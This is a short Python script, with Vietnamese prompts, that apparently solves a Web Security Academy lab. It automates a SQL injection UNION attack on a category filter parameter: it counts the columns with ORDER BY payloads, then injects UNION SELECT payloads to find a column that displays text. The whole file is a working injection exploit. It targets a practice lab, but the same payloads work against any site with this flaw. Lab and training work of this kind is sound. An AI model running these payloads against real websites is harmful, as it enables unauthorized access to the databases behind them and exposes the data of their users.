#SQL injection UNION attack, finding a column containing text
import requests

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    url = f"{base_url}/filter?category=Accessories' ORDER BY {i}--"
    response = requests.get(url)

    if response.status_code == 200:
        print(f"[+] ORDER BY {i} => OK")
        i += 1
    else:
        print(f"[-] ORDER BY {i} => FAIL")
        i -= 1
        break
    
print(f"[+] Số lượng cột là: {i}")
print(f"[!] Bắt đầu tìm một cột chứa văn bản...")

for j in range(i):
    payload = ["NULL"] * i
    payload[j] = "'test'"
    union_payload = ",".join(payload)
    
    url = f"{base_url}/filter?category=Accessories' UNION SELECT {union_payload}--"
    response = requests.get(url)
    
    if "test" in response.text:
        print(f"[+] Ngon, cột chứa text là cột số {j+1}")
        break
else:
    print("[-] Thua, không tìm thấy cột nào hiển thị text.")